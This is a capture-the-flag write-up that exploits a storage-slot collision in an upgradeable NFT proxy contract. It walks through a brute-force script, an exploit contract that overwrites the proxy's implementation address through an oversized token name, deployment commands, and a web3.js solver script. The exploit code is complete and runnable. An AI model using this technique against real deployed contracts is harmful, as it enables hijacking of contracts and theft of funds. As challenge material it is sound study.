---
layout: post
description: My favorite TikTok influencer told me about a great NFT project that is guaranteed to not be a scam. It even has this cool feature where you can name your token :^)
---

We are given a contract based on ERC721, deployed through an upgradeable proxy.

`Setup.sol`
{% prism solidity %}
//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.20;

import "./UpgradeableProxy.sol";
import "./CryptoFlags.sol";

contract Setup {
    CryptoFlags public cryptoFlags;

    constructor() payable {
        UpgradeableProxy proxy = new UpgradeableProxy();
        CryptoFlags impl = new CryptoFlags();
        proxy.upgradeTo(address(impl));
        cryptoFlags = CryptoFlags(address(proxy));
    }

    function isSolved() public view returns (bool) {
        return cryptoFlags.isSolved();
    }
}
{% endprism %}

`UpgradeableProxy.sol`
{% prism solidity %}
//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.20;

contract UpgradeableProxy {
    // keccak256("owner_storage");
    bytes32 public constant OWNER_STORAGE = 0x6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb;
    // keccak256("implementation_storage");
    bytes32 public constant IMPLEMENTATION_STORAGE = 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6;

    struct AddressSlot {
        address value;
    }

    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }

    constructor() {
        AddressSlot storage owner = getAddressSlot(OWNER_STORAGE);
        owner.value = msg.sender;
    }

    function upgradeTo(address implementation) external {
        require(msg.sender == getAddressSlot(OWNER_STORAGE).value, "Only owner can upgrade");
        getAddressSlot(IMPLEMENTATION_STORAGE).value = implementation;
    }

    function _delegate(address implementation) internal {
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    fallback() external payable {
        _delegate(getAddressSlot(IMPLEMENTATION_STORAGE).value);
    }
}
{% endprism %}

`CryptoFlags.sol`
{% prism solidity %}
//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.20;

import "./ERC721_flattened.sol";

contract CryptoFlags is ERC721 {
    mapping(uint256 => string) public FlagNames;

    constructor()
        ERC721("CryptoFlags", "CTF")
    {
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal override virtual {
        require(from == address(0), "no flag sharing pls :^)");
        to; tokenId;
    }

    function setFlagName(uint256 id, string memory name) external {
        require(ownerOf(id) == msg.sender, "Only owner can name the flag");
        require(bytes(FlagNames[id]).length == 0, "that flag already has a name");
        FlagNames[id] = name;
    }

    function claimFlag(uint256 id) external {
        require(id <= 100_000_000, "Only the first 100_000_000 ids allowed");
        _mint(msg.sender, id);
    }

    function isSolved() external pure returns (bool) {
        return false;
    }
}
{% endprism %}

`ERC721_flattended.sol` is just the OpenZeppelin implementation of `ERC721` with all dependencies bundled.

We can claim an NFT of our own and name it using a custom string with no length check.

Because the proxy is upgradeable, it can't store proxy data inside default storage slots, as they 
will collide with the implementation's data when calling `delegatecall`. So, it uses
a custom value for each of the storage items. There is actually a standard for this, named
`ERC-7201`, which the proxy does not use.

## Solidity storage layout

`CryptoFlags` has a mapping of type `uint256 => string`. Solidity stores mapping data using a known
formula, as explained [here](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html).

`CryptoFlags` inherits from `ERC721` which also has some storage slots taken (6). So, `FlagNames` will
come after them, being the 7th slot (index 6, as it starts from 0).

To compute the value of a key in the mapping, we have the following formula: `keccak256(key . uint256(6))`.
The `.` operator is the concatenation of bytes, similar to `abi.encodePacked`.

The value in the mapping is a string. From the same documentation link, we find that if the string has >= 31 
characters, it will be stored at `keccak256(address)`. 

## Exploit

We can claim any flag ID until 100.000.000. Knowing the formula for the storage layout, we can write a Python script
that bruteforces every flag ID to find a collision for either the implementation slot or the owner slot.

We do not have to find the exact value, as we are not limited for the string length. Any value close to the slot
(but before the slot) is good.

{% prism python %}
from Crypto.Hash import keccak

def get_hash(value):
    k = keccak.new(digest_bits=256)
    k.update(value)
    return k.digest()

CANDIDATES = [int.from_bytes(i, "big") for i in [
    b"implementation_storage",
    b"owner_storage"
]]
CANDIDATES = [
    0x6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb,
    0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6,
]

min_delta = None

for i in range(100_000_000):
    if i % 1_000_000 == 0:
        print(f"checkpoint: {i}")
        print(min_delta)
    value = i.to_bytes(32) + (6).to_bytes(32)
    hash_value = int.from_bytes(get_hash(get_hash(value)), "big")
    for candidate in CANDIDATES:
        delta = candidate - hash_value
        if delta >= 0 and (min_delta is None or delta < min_delta):
            min_delta = delta
        if delta >= 0 and delta <= 10000:
            print(i, hex(hash_value), hex(candidate))

print(min_delta)
{% endprism %}

For ID 56.488.061 there is a collision for the implementation slot. The collision is 141 slots (1 slot == 32 bytes)
earlier than the slot.

We can overwrite the 141 slots with random data and fill the desired slot with the address of the new implementation.

Exploit code:
{% prism solidity %}
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.20;

import { ERC721 } from "./ERC721_flattened.sol";
import { CryptoFlags } from "./CryptoFlags.sol";

contract ExploitImpl is ERC721 {
  mapping(uint256 => string) public FlagNames;

  constructor()
      ERC721("CryptoFlags", "CTF")
  {}

  function isSolved() external pure returns (bool) {
      return true;
  }
}

contract Exploit {
  CryptoFlags flags;

  constructor(address flagsAddress) {
    flags = CryptoFlags(flagsAddress);
  }

  function exploit(address exploitImplAddress) external {
    uint256 flagId = 56488061;
    string memory slot = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    string memory newImplementation = string(abi.encode(exploitImplAddress));
    string memory payload;

    for (uint256 i = 0; i < 141; i += 1) {
      payload = string.concat(payload, slot);
    }
    payload = string.concat(payload, newImplementation);

    flags.claimFlag(flagId);
    flags.setFlagName(flagId, payload);
  }
}
{% endprism %}

1. Get the `CryptoFlags` address: `FLAGS=$(cast call --rpc-url $RPC $SETUP "cryptoFlags() (address)")`
2. Deploy the Exploit contract: `forge create --broadcast --rpc-url $RPC --private-key $KEY ./Exploit.sol:Exploit --constructor-args $FLAGS`
3. Deploy the rogue implementation of the contract: `forge create --broadcast --rpc-url $RPC --private-key $KEY ./Exploit.sol:ExploitImpl`
4. Call the `exploit` method: `cast send --rpc-url $RPC --private-key $KEY $EXPLOIT "exploit(address)" $EXPLOIT_IMPL`
5. Check if the challenge is solved: `cast call --rpc-url $RPC $SETUP "isSolved() (bool)"`

Initially, I wanted to call the `claimFlag` and `setFlagName` functions manually using `cast`, without the need
for a second contract. However, the server crashed after calling `setFlagName`. I don't know why, maybe there
was too much data being sent.

I also wrote a solver script using `web3.js`. At the end (after `return`) there is the initial attempt of calling
these functions manually.

{% prism js %}
const { Web3 } = require("web3");
const solc = require("solc");
const path = require("path");
const fs = require("fs");

const RPC_URL = "http://10.244.0.1:8545";
const CONFIG = JSON.parse(`
    {
        "setup": "0x042ecBf75FC7A76562C1123E735Eb22C570fc4f9",
        "address": "0x048bB2aDD31d4df0b19BF210ef0858035B109c75",
        "private_key": "0xc8a0d23425d64c81c328a98aab95ab250fc8effb5d990699ef521440e0b55372"
    }
`)
const PRIVATE_KEY = CONFIG["private_key"]; 
const SETUP = CONFIG["setup"];

const web3 = new Web3(RPC_URL);
const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
web3.eth.accounts.wallet.add(account);

const sourceFiles = [
  "Exploit.sol",
  "ERC721_flattened.sol",
  "CryptoFlags.sol",
  "Setup.sol",
  "UpgradeableProxy.sol"
];

(async () => {
  const input = {
    language: "Solidity",
    sources: Object.fromEntries(
      sourceFiles.map(file => [
        file,
        {
          content: fs.readFileSync(path.join(__dirname, file), "utf8"),
        }
      ])
    ),
    settings: {
      outputSelection: {
        '*': {
          '*': ['*'],
        },
      },
    },
  };
  const compiled = JSON.parse(solc.compile(JSON.stringify(input)));
  const { evm: { bytecode: { object: exploitImplBytecode } }, abi: exploitImplAbi } = compiled.contracts["Exploit.sol"]["ExploitImpl"];
  const { evm: { bytecode: { object: exploitBytecode } }, abi: exploitAbi } = compiled.contracts["Exploit.sol"]["Exploit"];

  const exploitImpl = new web3.eth.Contract(exploitImplAbi);
  const exploit = new web3.eth.Contract(exploitAbi);

  const { options: { address: exploitImplAddress } } = await exploitImpl.deploy({
    data: "0x" + exploitImplBytecode
  }).send({
    from: account.address,
  });
  console.log(`deployed exploit impl at ${exploitImplAddress}`);

  const setup = new web3.eth.Contract(compiled.contracts["Setup.sol"]["Setup"].abi, SETUP);
  const flags = new web3.eth.Contract(compiled.contracts["CryptoFlags.sol"]["CryptoFlags"].abi, await setup.methods.cryptoFlags().call());

  const { options: { address: exploitAddress } } = await exploit.deploy({
    data: "0x" + exploitBytecode,
    arguments: [flags.options.address]
  }).send({
    from: account.address,
  });
  console.log(`deployed exploit at ${exploitAddress}`);

  async function sendMethod(target, method) {
    const tx = {
      from: account.address,
      to: target.options.address,
      gas: 9999999,
      gasPrice: await web3.eth.getGasPrice(),
      data: method.encodeABI()
    };
    const signed = await web3.eth.accounts.signTransaction(tx, PRIVATE_KEY);
    await web3.eth.sendSignedTransaction(signed.rawTransaction);
  }

  const deployedExploit = new web3.eth.Contract(compiled.contracts["Exploit.sol"]["Exploit"].abi, exploitAddress);

  await sendMethod(deployedExploit, deployedExploit.methods.exploit(exploitImplAddress));
  console.log(await setup.methods.isSolved().call());

  return;

  const FLAG_ID = 56488061;

  await sendMethod(flags, flags.methods.claimFlag(FLAG_ID));
  console.log("claimed flag");

  const slot = "\x00".repeat(32);
  const payload = slot.repeat(141) + Buffer.from(web3.eth.abi.encodeParameter("uint256", exploitAddress).slice(2), "hex").toString();
  await sendMethod(flags, flags.methods.setFlagName(FLAG_ID, payload));
  console.log("set flag name");

  console.log(await setup.methods.isSolved().call());
})();
{% endprism %}